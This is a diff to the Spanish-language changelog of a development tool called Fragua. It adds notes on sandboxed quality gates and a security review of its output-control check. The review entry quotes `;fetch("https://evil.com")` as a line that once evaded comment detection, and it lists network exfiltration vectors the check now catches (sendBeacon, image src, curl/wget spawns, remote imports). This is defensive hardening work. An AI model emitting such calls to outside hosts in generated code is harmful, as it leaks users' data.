@@ -15,6 +15,13 @@ Formato: [Keep a Changelog](https://keepachangelog.com/es/1.0.0/).
 
 > **Nombre:** el producto pasa a llamarse **Fragua** (decisión del 2026-10-13). El paquete de npm es `fragua` y la orden principal es `fragua`; `forge` y `sdd-es` siguen funcionando, igual que las variables `FORGE_*` junto a `FRAGUA_*`. Nombres de comandos `sdd.*`, carpetas y skills no cambian. Ver `.sdd/especificaciones/2026-10-13-renombrar-a-fragua/`.
 
+### Puertas de calidad declarables en `fragua verificar` (spec `2026-10-14-puertas-de-calidad-y-evidencia`, fase B1, 2026-10-17)
+
+- **Nuevo.** Una sección `puertas:` en `.sdd/sdd.config.yaml` declara `tipos`, `linter`, `seguridad` y `cobertura` (un comando cada una). Corren en el mismo contenedor sin red, en serie, solo si las pruebas pasan; cualquier puerta que no pase (fallo, tiempo, herramienta ausente 127, fallo del aislamiento) impide el éxito y el resultado la nombra. Sin la sección, nada cambia. Ver `docs/puertas-de-calidad.md`.
+- **Solo se aprieta.** Una clave desconocida es un error con su línea; no hay clave que quite o afloje una garantía fija; los topes de tiempo y salida salen del entorno con techo y el proyecto solo los baja; el comando no pasa por un intérprete (ni `&&`, `|`, `;`, `sh -c`); no hay `--sin-puertas`.
+- **Contrato.** `resultado-verificar` 1.2: bloque opcional `puertas` y `evidencia.puertas` (`formato` sigue en 1). Las puertas entran en el hash del informe registrado.
+- **No hecho.** Integración con el ciclo (nodo, enrutador, evento), cableado de la configuración protegida y medición con Docker real.
+
 ### Revisión independiente nº 1 de la defensa: control de salida y MCP (2026-10-17)
 
 - **Seguridad.** El control de salida decide qué es un comentario **por lenguaje** (antes cualquier línea que empezara por `;`, `%`, `--` o `*` se saltaba, y `;fetch("https://evil.com")` pasaba); mira más vías de red (`sendBeacon`, `new Image().src`, `exec`/`spawn` de `curl`/`wget`, `import("https://…")`, `url(…)`, SVG) y trata `.html` como código; y un host que sólo estaba en un comentario del archivo anterior ya no queda pre-autorizado (H-2, H-3, H-4).
